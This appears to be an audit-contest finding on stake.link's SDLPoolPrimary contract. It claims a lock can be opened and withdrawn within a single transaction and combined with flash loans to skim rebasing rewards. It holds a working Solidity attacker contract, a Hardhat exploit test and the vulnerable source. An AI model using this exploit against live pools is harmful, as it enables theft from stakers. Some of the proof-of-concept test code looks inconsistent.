{
  "Title": "Can lock Fund for 1 sec and unlock in same transaction to gain profit",
  "Content": "# Can lock Fund for 1 sec and unlock in same transaction to gain profit\n\n### Severity\nHigh Risk\n\n### Relevant GitHub Links\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/sdlPool/SDLPoolPrimary.sol#L107C4-L122C1\">https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/sdlPool/SDLPoolPrimary.sol#L107C4-L122C1</a>\n\n\n## Summary\n\nCan lock Fund for 1 sec and unlock in same transaction to gain profit even if it's small amount yet there's no flashloan protection so malicious user can flashloan big amount and sandwich the rebasing upkeep to take advantage of the pool with dividing leads to zero problem to gain profit from pool.This way totalstaked amount can be manupilated. Checkupkeep and performUkeep completely user accessible so totalstake amount can change for the favor of malicious user\n<details>\n  <summary style=\"font-weight: bold; cursor: pointer;\">Click to see Attack contract</summary>\n  \n  <p style=\"margin-left: 20px;\">\n\n```\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.15;\nimport{IERC677Receiver} from \"../core/interfaces/IERC677Receiver.sol\";\nimport{IERC721Receiver} from \"../core/interfaces/IERC721Receiver.sol\";\nimport{IERC677} from \"../core/interfaces/IERC677.sol\";\nimport{SDLPoolPrimary} from \"../core/sdlPool/SDLPoolPrimary.sol\";\n\ninterface IRESDLTokenBridge{\n    function transferRESDL(\n        uint64 _destinationChainSelector,\n        address _receiver,\n        uint256 _tokenId,\n        bool _payNative,\n        uint256 _maxLINKFee\n    ) external payable returns (bytes32 messageId);\n}\n\ncontract Attacker is IERC677Receiver{\n       struct Data {\n        address operator;\n        address from;\n        uint256 tokenId;\n        bytes data;\n    }\n    SDLPoolPrimary public sdlPool;\n    IRESDLTokenBridge public tokenBridge;\n    IERC677 public sdlToken;\n    uint256 public latestLockId;\n    uint256 public totalRewards;\n    Data[] private data;\n    bool public received;\n    constructor(address _sdlPool,address _tokenBridge,address _sdlToken)payable{\n     sdlPool=SDLPoolPrimary(_sdlPool);\n     tokenBridge=IRESDLTokenBridge(_tokenBridge);\n     sdlToken=IERC677(_sdlToken);\n    }\n    function getData() external view returns (Data[] memory) {\n        return data;\n    }\n\n    function onERC721Received(\n        address _operator,\n        address _from,\n        uint256 _tokenId,\n        bytes calldata _data\n    ) external returns (bytes4) {\n        data.push(Data(_operator, _from, _tokenId, _data));\n        received=true;\n        return this.onERC721Received.selector;\n    }\n   \n\n    //@audit in all 1 transaction  u can lock-initiateunlock-withdraw thanks to \n    //@audit rounddown to zero...\n    function attackTransfernCall() public payable{\n     sdlToken.transferAndCall(address(sdlPool),200 ether ,abi.encode(uint256(0), uint64(1)));\n     sdlPool.initiateUnlock(getLockId());\n     sdlPool.withdraw(getLockId(),200 ether);\n    } \n\n     function attackCcipTransfer() public payable{\n       tokenBridge.transferRESDL{value:15 ether}(77,address(this),getLockId(),true,15 ether);\n    } \n\n    function onTokenTransfer(\n        address,\n        uint256 _value,\n        bytes calldata\n    ) external virtual {\n        totalRewards += _value;\n    }\nfunction getLockId()public view returns(uint256){\nuint256[] memory lockIDs= new uint256[](1);\nlockIDs=sdlPool.getLockIdsByOwner(address(this));\n    return lockIDs[0];\n}\n    receive() external payable{\n\n    \n      }\n    }\n}\n``` \n</p>\n  \n \n</details>\ntest case for hardhat(same test suit provided by Protocol)\nrun with \n\n```\nnpx hardhat test --network hardhat --grep 'usage of Attack contract and receiving NFT'\n\n```\n\n```\n import { Signer } from 'ethers'\nimport { assert, expect } from 'chai'\nimport {\n  toEther,\n  deploy,\n  getAccounts,\n  setupToken,\n  fromEther,\n  deployUpgradeable,\n} from '../../utils/helpers'\nimport {\n  ERC677,\n  LinearBoostController,\n  RewardsPool,\n  SDLPoolPrimary,\n  StakingAllowance,\n  Attacker\n} from '../../../typechain-types'\nimport { ethers } from 'hardhat'\nimport { time } from '@nomicfoundation/hardhat-network-helpers'\n//1 day in seconds...\nconst DAY = 86400\n\n// parsing Lock struct in contracts...\nconst parseLocks = (locks: any) =>\n  locks.map((l: any) => ({\n    amount: fromEther(l.amount),\n    //show 4 digits after decimal...\n    boostAmount: Number(fromEther(l.boostAmount).toFixed(10)),\n    startTime: l.startTime.toNumber(),\n    duration: l.duration.toNumber(),\n    expiry: l.expiry.toNumber(),\n  }))\n\n  const parseData=(data:any)=>({\n    operator:data.operator,\n    from:data.from,\n    tokenId:data.tokenId,\n    data: Buffer.from(data.data.slice(2), 'hex').toString('utf8')\n  })\n\ndescribe('SDLPoolPrimary', () => {\n  let sdlToken: StakingAllowance\n  let rewardToken: ERC677\n  let rewardsPool: RewardsPool\n  let boostController: LinearBoostController\n  let sdlPool: SDLPoolPrimary\n  let signers: Signer[]\n  let accounts: string[]\n  let attacker:Attacker\n  before(async () => {\n    ;({ signers, accounts } = await getAccounts())\n  })\n\n  beforeEach(async () => {\n    sdlToken = (await deploy('StakingAllowance', ['stake.link', 'SDL'])) as StakingAllowance\n    rewardToken = (await deploy('ERC677', ['Chainlink', 'LINK', 1000000000])) as ERC677\n\n    await sdlToken.mint(accounts[0], toEther(1000000))\n    await setupToken(sdlToken, accounts)\n\n    boostController = (await deploy('LinearBoostController', [\n      4 * 365 * DAY,\n      4,\n    ])) as LinearBoostController\n\n    sdlPool = (await deployUpgradeable('SDLPoolPrimary', [\n      'Reward Escrowed SDL',\n      'reSDL',\n      sdlToken.address,\n      boostController.address,\n    ])) as SDLPoolPrimary\n\n    rewardsPool = (await deploy('RewardsPool', [\n      sdlPool.address,\n      rewardToken.address,\n    ])) as RewardsPool\n\n    await sdlPool.addToken(rewardToken.address, rewardsPool.address)\n    await sdlPool.setCCIPController(accounts[0])\n    //attack contract deployment -- setting bridge contract to same we wont need ccip here\n    attacker=await deploy(\"Attacker\",[sdlPool.address,sdlPool.address,sdlToken.address]) as Attacker\n    await sdlToken.transfer(attacker.address,toEther(20000))\n    const sender = signers[0] // or choose any unlocked account\n    const valueToSend = ethers.utils.parseEther(\"100\") // Amount of Ether to send\n    const tx = await sender.sendTransaction({\n      to: attacker.address,\n      value: valueToSend,\n    });\n  \n    await tx.wait();\n    console.log(\"Funded contract!\");\n  })\n  it('should be able to lock an existing stake', async () => {\n    //with flashloan this may prove fatal...\n    await sdlToken.transferAndCall(\n      sdlPool.address,\n      toEther(10000),\n      ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [0, 0])\n    )\n    await sdlPool.extendLockDuration(1, 365 * DAY)\n    let ts = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp\n\n    assert.equal(fromEther(await sdlPool.totalEffectiveBalance()), 200)\n    assert.equal(fromEther(await sdlPool.totalStaked()), 200)\n    assert.equal(fromEther(await sdlPool.effectiveBalanceOf(accounts[0])), 200)\n    assert.equal(fromEther(await sdlPool.staked(accounts[0])), 200)\n    assert.deepEqual(parseLocks(await sdlPool.getLocks([1])), [\n      { amount: 100, boostAmount: 100, startTime: ts, duration: 365 * DAY, expiry: 0 },\n    ])\n\n    // Move one block forward\n  //await ethers.provider.send('evm_mine', []);\n  //console.log(\"Parsed lock :\",parseLocks(await sdlPool.getLocks([1])))\n  })\n  //@audit NFT onERC721receiver doesnt work it seems..\n  it('usage of Attack contract and receiving NFT', async () => {\n  console.log(\"Block-number before tx:\",await ethers.provider.getBlockNumber())\n  let ts = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp\n          // Move one block forward\n  await ethers.provider.send('evm_mine', [ts+1]);\n  console.log(\"SDLToken  balance Before:\",await sdlToken.balanceOf(attacker.address))\n  await attacker.attackTransfernCall()\n  console.log(\"Lock\",parseLocks(await sdlPool.getLocks([1])))\n  console.log(\"Block-number after tx:\",await ethers.provider.getBlockNumber())\n  console.log(\"Nft received ??:\",await attacker.received());\n//boostAmount: 0.0006341958 20_000 -> with flashloan\n//boostAmount: 0.000006342  200  \n  })\n})\n\n```\n\n## Impact\nLoss of pool reward gained by rebasing.\n## Tools Used\n\nHardhat-manuel review\n\n## Recommendations\n\nSetting lower-limit of locking time to stop bypassing 1 transaction lock-unlock-withdraw .This way it might stop the flashloan attacks too.\nPreferable  minimum 1 day.",
  "Impact": "LOW",
  "Source": "https://www.codehawks.com/contests/clqf7mgla0001yeyfah59c674",
  "Code": [
    {
      "filename": "contracts/core/sdlPool/SDLPoolPrimary.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.15;\n\nimport \"./base/SDLPool.sol\";\n\n/**\n * @title SDL Pool Primary\n * @notice Allows users to stake/lock SDL tokens and receive a percentage of the protocol's earned rewards\n * @dev deployed only on the primary chain\n */\ncontract SDLPoolPrimary is SDLPool {\n    using SafeERC20Upgradeable for IERC20Upgradeable;\n\n    address public delegatorPool;\n\n    event IncomingUpdate(uint256 numNewRESDLTokens, int256 totalRESDLSupplyChange, uint256 mintStartIndex);\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    /**\n     * @notice initializes contract\n     * @param _name name of the staking derivative token\n     * @param _symbol symbol of the staking derivative token\n     * @param _sdlToken address of the SDL token\n     * @param _boostController address of the boost controller\n     **/\n    function initialize(\n        string memory _name,\n        string memory _symbol,\n        address _sdlToken,\n        address _boostController\n    ) public reinitializer(2) {\n        if (delegatorPool == address(0)) {\n            __SDLPoolBase_init(_name, _symbol, _sdlToken, _boostController);\n        } else {\n            delegatorPool = ccipController;\n        }\n    }\n\n    /**\n     * @notice ERC677 implementation to stake/lock SDL tokens or distribute rewards\n     * @dev\n     * - will update/create a lock if the token transferred is SDL or will distribute rewards otherwise\n     *\n     * For Non-SDL:\n     * - reverts if token is unsupported\n     *\n     * For SDL:\n     * - set lockId to 0 to create a new lock or set lockId to > 0 to stake more into an existing lock\n     * - set lockingDuration to 0 to stake without locking or set lockingDuration to > 0 to lock for an amount\n     *   time in seconds\n     * - see _updateLock() for more details on updating an existing lock or _createLock() for more details on\n     *   creating a new lock\n     * @param _sender of the stake\n     * @param _value of the token transfer\n     * @param _calldata encoded lockId (uint256) and lockingDuration (uint64)\n     **/\n    function onTokenTransfer(\n        address _sender,\n        uint256 _value,\n        bytes calldata _calldata\n    ) external override {\n        if (msg.sender != address(sdlToken) && !isTokenSupported(msg.sender)) revert UnauthorizedToken();\n\n        if (_value == 0) revert InvalidValue();\n\n        if (msg.sender == address(sdlToken)) {\n            (uint256 lockId, uint64 lockingDuration) = abi.decode(_calldata, (uint256, uint64));\n            if (lockId != 0) {\n                _storeUpdatedLock(_sender, lockId, _value, lockingDuration);\n            } else {\n                _storeNewLock(_sender, _value, lockingDuration);\n            }\n        } else {\n            distributeToken(msg.sender);\n        }\n    }\n\n    /**\n     * @notice extends the locking duration of a lock\n     * @dev\n     * - reverts if `_lockId` is invalid or sender is not owner of lock\n     * - reverts if `_lockingDuration` is less than current locking duration of lock\n     * - reverts if `_lockingDuration` is 0 or exceeds the maximum\n     * @param _lockId id of lock\n     * @param _lockingDuration new locking duration to set\n     **/\n    function extendLockDuration(uint256 _lockId, uint64 _lockingDuration) external {\n        if (_lockingDuration == 0) revert InvalidLockingDuration();\n        _storeUpdatedLock(msg.sender, _lockId, 0, _lockingDuration);\n    }\n\n    /**\n     * @notice initiates the unlock period for a lock\n     * @dev\n     * - at least half of the locking duration must have elapsed to initiate the unlock period\n     * - the unlock period consists of half of the locking duration\n     * - boost will be set to 0 upon initiation of the unlock period\n     *\n     * - reverts if `_lockId` is invalid or sender is not owner of lock\n     * - reverts if a minimum of half the locking duration has not elapsed\n     * @param _lockId id of lock\n     **/\n    function initiateUnlock(uint256 _lockId) external onlyLockOwner(_lockId, msg.sender) updateRewards(msg.sender) {\n        if (locks[_lockId].expiry != 0) revert UnlockAlreadyInitiated();\n        uint64 halfDuration = locks[_lockId].duration / 2;\n        if (locks[_lockId].startTime + halfDuration > block.timestamp) revert HalfDurationNotElapsed();\n\n        uint64 expiry = uint64(block.timestamp) + halfDuration;\n        locks[_lockId].expiry = expiry;\n\n        uint256 boostAmount = locks[_lockId].boostAmount;\n        locks[_lockId].boostAmount = 0;\n        effectiveBalances[msg.sender] -= boostAmount;\n        totalEffectiveBalance -= boostAmount;\n\n        emit InitiateUnlock(msg.sender, _lockId, expiry);\n    }\n\n    /**\n     * @notice withdraws unlocked SDL\n     * @dev\n     * - SDL can only be withdrawn if unlocked (once the unlock period has elapsed or if it was never\n     *   locked in the first place)\n     * - reverts if `_lockId` is invalid or sender is not owner of lock\n     * - reverts if not unlocked\n     * - reverts if `_amount` exceeds the amount staked in the lock\n     * @param _lockId id of the lock\n     * @param _amount amount to withdraw from the lock\n     **/\n    function withdraw(uint256 _lockId, uint256 _amount)\n        external\n        onlyLockOwner(_lockId, msg.sender)\n        updateRewards(msg.sender)\n    {\n        if (locks[_lockId].startTime != 0) {\n            uint64 expiry = locks[_lockId].expiry;\n            if (expiry == 0) revert UnlockNotInitiated();\n            if (expiry > block.timestamp) revert TotalDurationNotElapsed();\n        }\n\n        uint256 baseAmount = locks[_lockId].amount;\n        if (_amount > baseAmount) revert InsufficientBalance();\n\n        emit Withdraw(msg.sender, _lockId, _amount);\n\n        if (_amount == baseAmount) {\n            delete locks[_lockId];\n            delete lockOwners[_lockId];\n            balances[msg.sender] -= 1;\n            if (tokenApprovals[_lockId] != address(0)) delete tokenApprovals[_lockId];\n            emit Transfer(msg.sender, address(0), _lockId);\n        } else {\n            locks[_lockId].amount = baseAmount - _amount;\n        }\n\n        effectiveBalances[msg.sender] -= _amount;\n        totalEffectiveBalance -= _amount;\n\n        sdlToken.safeTransfer(msg.sender, _amount);\n    }\n\n    /**\n     * @notice handles an outgoing transfer of an reSDL lock to another chain\n     * @param _sender sender of lock\n     * @param _lockId id of lock\n     * @param _sdlReceiver address to receive underlying SDL on this chain\n     */\n    function handleOutgoingRESDL(\n        address _sender,\n        uint256 _lockId,\n        address _sdlReceiver\n    )\n        external\n        onlyCCIPController\n        onlyLockOwner(_lockId, _sender)\n        updateRewards(_sender)\n        updateRewards(ccipController)\n        returns (Lock memory)\n    {\n        Lock memory lock = locks[_lockId];\n\n        delete locks[_lockId].amount;\n        delete lockOwners[_lockId];\n        balances[_sender] -= 1;\n\n        uint256 totalAmount = lock.amount + lock.boostAmount;\n        effectiveBalances[_sender] -= totalAmount;\n        effectiveBalances[ccipController] += totalAmount;\n\n        sdlToken.safeTransfer(_sdlReceiver, lock.amount);\n\n        emit OutgoingRESDL(_sender, _lockId);\n\n        return lock;\n    }\n\n    /**\n     * @notice handles an incoming transfer of an reSDL lock from another chain\n     * @param _receiver receiver of lock\n     * @param _lockId id of lock\n     * @param _lock lock\n     */\n    function handleIncomingRESDL(\n        address _receiver,\n        uint256 _lockId,\n        Lock calldata _lock\n    ) external onlyCCIPController updateRewards(_receiver) updateRewards(ccipController) {\n        if (lockOwners[_lockId] != address(0)) revert InvalidLockId();\n\n        locks[_lockId] = Lock(_lock.amount, _lock.boostAmount, _lock.startTime, _lock.duration, _lock.expiry);\n        lockOwners[_lockId] = _receiver;\n        balances[_receiver] += 1;\n\n        uint256 totalAmount = _lock.amount + _lock.boostAmount;\n        effectiveBalances[_receiver] += totalAmount;\n        effectiveBalances[ccipController] -= totalAmount;\n\n        emit IncomingRESDL(_receiver, _lockId);\n    }\n\n    /**\n     * @notice handles an incoming update from a secondary chain\n     * @dev updates the total reSDL supply and keeps reSDL lock ids consistent between chains\n     * @param _numNewRESDLTokens number of new reSDL locks to be minted on other chain\n     * @param _totalRESDLSupplyChange total reSDL supply change on other chain\n     */\n    function handleIncomingUpdate(uint256 _numNewRESDLTokens, int256 _totalRESDLSupplyChange)\n        external\n        onlyCCIPController\n        returns (uint256)\n    {\n        uint256 mintStartIndex;\n        if (_numNewRESDLTokens != 0) {\n            mintStartIndex = lastLockId + 1;\n            lastLockId += _numNewRESDLTokens;\n        }\n\n        if (_totalRESDLSupplyChange > 0) {\n            effectiveBalances[ccipController] += uint256(_totalRESDLSupplyChange);\n            totalEffectiveBalance += uint256(_totalRESDLSupplyChange);\n        } else if (_totalRESDLSupplyChange < 0) {\n            effectiveBalances[ccipController] -= uint256(-1 * _totalRESDLSupplyChange);\n            totalEffectiveBalance -= uint256(-1 * _totalRESDLSupplyChange);\n        }\n\n        emit IncomingUpdate(_numNewRESDLTokens, _totalRESDLSupplyChange, mintStartIndex);\n\n        return mintStartIndex;\n    }\n\n    /**\n     * @notice used by the delegator pool to migrate user stakes to this contract\n     * @dev\n     * - creates a new lock to represent the migrated stake\n     * - reverts if `_lockingDuration` exceeds maximum\n     * @param _sender owner of lock\n     * @param _amount amount to stake\n     * @param _lockingDuration duration of lock\n     */\n    function migrate(\n        address _sender,\n        uint256 _amount,\n        uint64 _lockingDuration\n    ) external {\n        if (msg.sender != delegatorPool) revert SenderNotAuthorized();\n        sdlToken.safeTransferFrom(delegatorPool, address(this), _amount);\n        _storeNewLock(_sender, _amount, _lockingDuration);\n    }\n\n    /**\n     * @notice stores a new lock\n     * @param _owner owner of lock\n     * @param _amount amount to stake\n     * @param _lockingDuration duration of lock\n     */\n    function _storeNewLock(\n        address _owner,\n        uint256 _amount,\n        uint64 _lockingDuration\n    ) internal updateRewards(_owner) {\n        Lock memory lock = _createLock(_amount, _lockingDuration);\n        uint256 lockId = lastLockId + 1;\n\n        locks[lockId] = lock;\n        lockOwners[lockId] = _owner;\n        balances[_owner] += 1;\n        lastLockId++;\n\n        uint256 totalAmount = lock.amount + lock.boostAmount;\n        effectiveBalances[_owner] += totalAmount;\n        totalEffectiveBalance += totalAmount;\n\n        emit CreateLock(_owner, lockId, lock.amount, lock.boostAmount, lock.duration);\n        emit Transfer(address(0), _owner, lockId);\n    }\n\n    /**\n     * @notice stores an updated lock\n     * @param _owner owner of lock\n     * @param _amount amount to stake\n     * @param _lockingDuration duration of lock\n     */\n    function _storeUpdatedLock(\n        address _owner,\n        uint256 _lockId,\n        uint256 _amount,\n        uint64 _lockingDuration\n    ) internal onlyLockOwner(_lockId, _owner) updateRewards(_owner) {\n        Lock memory lock = _updateLock(locks[_lockId], _amount, _lockingDuration);\n\n        int256 diffTotalAmount = int256(lock.amount + lock.boostAmount) -\n            int256(locks[_lockId].amount + locks[_lockId].boostAmount);\n\n        if (diffTotalAmount > 0) {\n            effectiveBalances[_owner] += uint256(diffTotalAmount);\n            totalEffectiveBalance += uint256(diffTotalAmount);\n        } else if (diffTotalAmount < 0) {\n            effectiveBalances[_owner] -= uint256(-1 * diffTotalAmount);\n            totalEffectiveBalance -= uint256(-1 * diffTotalAmount);\n        }\n\n        locks[_lockId] = lock;\n\n        emit UpdateLock(_owner, _lockId, lock.amount, lock.boostAmount, lock.duration);\n    }\n}"
    }
  ]
}